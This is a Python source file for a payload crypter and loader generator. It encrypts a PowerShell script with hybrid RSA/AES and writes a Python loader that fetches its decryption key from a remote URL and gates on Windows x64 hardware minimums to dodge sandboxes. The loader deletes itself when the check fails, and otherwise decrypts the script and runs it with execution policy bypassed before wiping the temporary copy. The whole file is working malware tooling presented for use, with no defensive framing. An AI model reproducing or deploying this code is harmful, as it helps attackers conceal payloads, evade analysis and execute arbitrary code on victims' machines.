from __future__ import annotations
import os
import sys
import json
import base64
import tempfile
import subprocess
import platform
import ctypes
import shutil
from typing import Tuple

try:
    import requests
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP, AES
    from Crypto.Random import get_random_bytes
    from Crypto.Hash import SHA256
except Exception:
    print("Missing dependency. Install with: pip install requests pycryptodome")
    sys.exit(1)

GENERATOR_TEMPLATE = r'''#!/usr/bin/env python3
import os, sys, json, base64, tempfile, subprocess, platform, ctypes, shutil
try:
    import requests
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP, AES
    from Crypto.Hash import SHA256
except Exception:
    print("Missing deps. Install: pip install requests pycryptodome")
    sys.exit(1)

ENC_PACKAGE_B64 = "{enc_b64}"
PRIVATE_KEY_URL = "{priv_url}"

def fetch_text(url, timeout=15):
    r = requests.get(url, timeout=timeout)
    r.raise_for_status()
    return r.text

def _get_total_ram_bytes():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_uint32),
            ("dwMemoryLoad", ctypes.c_uint32),
            ("ullTotalPhys", ctypes.c_uint64),
            ("ullAvailPhys", ctypes.c_uint64),
            ("ullTotalPageFile", ctypes.c_uint64),
            ("ullAvailPageFile", ctypes.c_uint64),
            ("ullTotalVirtual", ctypes.c_uint64),
            ("ullAvailVirtual", ctypes.c_uint64),
            ("sullAvailExtendedVirtual", ctypes.c_uint64),
        ]
    stat = MEMORYSTATUSEX()
    stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
        raise OSError("GlobalMemoryStatusEx failed")
    return int(stat.ullTotalPhys)

def check_system_requirements(min_gb=4, min_cpus=4):
    if platform.system() != "Windows":
        return False, "OS is not Windows"
    arch = platform.machine().lower()
    if arch not in ("amd64", "x86_64"):
        return False, f"Architecture {arch} is not x64"
    cpus = os.cpu_count() or 1
    if cpus < min_cpus:
        return False, f"Logical CPUs {cpus} < {min_cpus}"
    try:
        total_bytes = _get_total_ram_bytes()
        gb = total_bytes / (1024**3)
    except Exception as e:
        return False, f"Could not determine RAM: {e}"
    if gb < min_gb:
        return False, f"RAM {gb:.2f}GB < {min_gb}GB"
    return True, "ok"

def decrypt_hybrid(pkg, rsa_priv_pem):
    enc_key = base64.b64decode(pkg["RsaKeyEnc"])
    nonce = base64.b64decode(pkg["Nonce"])
    tag = base64.b64decode(pkg["Tag"])
    cipher = base64.b64decode(pkg["Cipher"])
    rsa = RSA.import_key(rsa_priv_pem)
    rsa_cipher = PKCS1_OAEP.new(rsa, hashAlgo=SHA256)
    aes_key = rsa_cipher.decrypt(enc_key)
    aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    plaintext = aes.decrypt_and_verify(cipher, tag)
    return plaintext

def find_powershell_exe():
    for name in ("pwsh.exe","pwsh","powershell.exe","powershell"):
        p = shutil.which(name)
        if p:
            return p
    return None

def secure_delete(path):
    try:
        if not os.path.exists(path):
            return
        size = os.path.getsize(path)
        with open(path, "r+b") as f:
            f.seek(0)
            f.write(b"\\x00" * size)
            f.flush()
            try:
                os.fsync(f.fileno())
            except Exception:
                pass
        os.remove(path)
    except Exception:
        try:
            os.remove(path)
        except Exception:
            pass

def main():
    try:
        pkg_json = base64.b64decode(ENC_PACKAGE_B64).decode("utf-8")
        pkg = json.loads(pkg_json)
    except Exception as e:
        print("Bad embedded package:", e); sys.exit(1)

    priv_url = PRIVATE_KEY_URL or pkg.get("PrivateKeyUrl")
    if not priv_url:
        priv_url = input("PrivateKeyUrl: ").strip()

    try:
        rsa_priv_pem = fetch_text(priv_url)
    except Exception as e:
        print("Failed to fetch private key:", e); sys.exit(1)

    ok, reason = check_system_requirements()
    if not ok:
        print("System check failed:", reason)
        try:
            secure_delete(__file__)
        except Exception:
            pass
        sys.exit(1)

    try:
        plaintext = decrypt_hybrid(pkg, rsa_priv_pem)
    except Exception as e:
        print("Decryption failed:", e); sys.exit(1)

    try:
        ps_text = plaintext.decode("utf-8")
    except Exception:
        ps_text = plaintext.decode("latin-1")

    fd, tmp = tempfile.mkstemp(suffix=".ps1", prefix="decrypted_")
    os.close(fd)
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(ps_text)

    ps_exe = find_powershell_exe()
    if not ps_exe:
        print("PowerShell not found in PATH")
        secure_delete(tmp)
        sys.exit(1)

    try:
        proc = subprocess.run([ps_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", tmp],
                              capture_output=True, text=True)
        if proc.stdout:
            print(proc.stdout, end="")
        if proc.stderr:
            print(proc.stderr, file=sys.stderr, end="")
        rc = proc.returncode
    except Exception as e:
        print("Execution failed:", e); rc = 1
    finally:
        secure_delete(tmp)
    sys.exit(rc)

if __name__ == "__main__":
    main()
'''

def fetch_text(url: str, timeout: int = 15) -> str:
    r = requests.get(url, timeout=timeout)
    r.raise_for_status()
    return r.text

def encrypt_hybrid(plaintext_bytes: bytes, pubkey_pem: str) -> dict:
    rsa = RSA.import_key(pubkey_pem)
    rsa_cipher = PKCS1_OAEP.new(rsa, hashAlgo=SHA256)
    aes_key = get_random_bytes(32)
    nonce = get_random_bytes(12)
    aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    cipher, tag = aes.encrypt_and_digest(plaintext_bytes)
    enc_key = rsa_cipher.encrypt(aes_key)
    return {
        "Alg": "RSA-OAEP-SHA256+AES-GCM-256",
        "RsaKeyEnc": base64.b64encode(enc_key).decode("ascii"),
        "Nonce": base64.b64encode(nonce).decode("ascii"),
        "Tag": base64.b64encode(tag).decode("ascii"),
        "Cipher": base64.b64encode(cipher).decode("ascii"),
    }

def safe_write_text(path: str, content: str) -> None:
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(content)
    os.replace(tmp, path)
    try:
        os.chmod(path, 0o700)
    except Exception:
        pass

def sanitize_github_raw_url(url: str) -> str:
    if "raw.githubusercontent.com" in url:
        return url
    if "github.com" in url:
        parts = url.split("/")
        try:
            idx = parts.index("github.com")
            user = parts[idx + 1]
            repo = parts[idx + 2]
            if "blob" in parts:
                bidx = parts.index("blob")
                branch = parts[bidx + 1]
                path = "/".join(parts[bidx + 2 :])
                return f"https://raw.githubusercontent.com/{user}/{repo}/{branch}/{path}"
            if "refs" in parts and "heads" in parts:
                ridx = parts.index("refs")
                if parts[ridx + 1] == "heads":
                    branch = parts[ridx + 2]
                    path = "/".join(parts[ridx + 3 :])
                    return f"https://raw.githubusercontent.com/{user}/{repo}/{branch}/{path}"
        except Exception:
            pass
    return url

def prompt_inputs() -> Tuple[str, str, str, str]:
    pub_url = input("Public PEM URL (raw HTTPS): ").strip()
    priv_url = input("Private PEM URL (will be embedded in generated file): ").strip()
    in_ps1 = input("Path to PowerShell .ps1 to encrypt: ").strip()
    out_py = input("Output filename (default payload_exec.py): ").strip() or "payload_exec.py"
    return pub_url, priv_url, in_ps1, out_py

def main():
    pub_url, priv_url, in_ps1, out_py = prompt_inputs()
    if not os.path.isfile(in_ps1):
        print("Input file not found:", in_ps1); sys.exit(1)
    pub_url = sanitize_github_raw_url(pub_url)
    priv_url = sanitize_github_raw_url(priv_url)
    try:
        pub_pem = fetch_text(pub_url)
    except Exception as e:
        print("Failed to fetch public PEM:", e); sys.exit(1)
    try:
        with open(in_ps1, "rb") as f:
            plaintext = f.read()
    except Exception as e:
        print("Failed to read input file:", e); sys.exit(1)
    try:
        pkg = encrypt_hybrid(plaintext, pub_pem)
        pkg["PrivateKeyUrl"] = priv_url
        json_str = json.dumps(pkg, separators=(",", ":"), ensure_ascii=False)
        b64 = base64.b64encode(json_str.encode("utf-8")).decode("ascii")
    except Exception as e:
        print("Encryption failed:", e); sys.exit(1)
    try:
        safe_priv = priv_url.replace("\\", "\\\\").replace('"', '\\"')
        final = GENERATOR_TEMPLATE.replace("{enc_b64}", b64).replace("{priv_url}", safe_priv)
        safe_write_text(out_py, final)
    except Exception as e:
        print("Failed to write output:", e); sys.exit(1)
    print("Generated executable file:", out_py)
    print("Run it with: python", out_py)

if __name__ == "__main__":
    main()
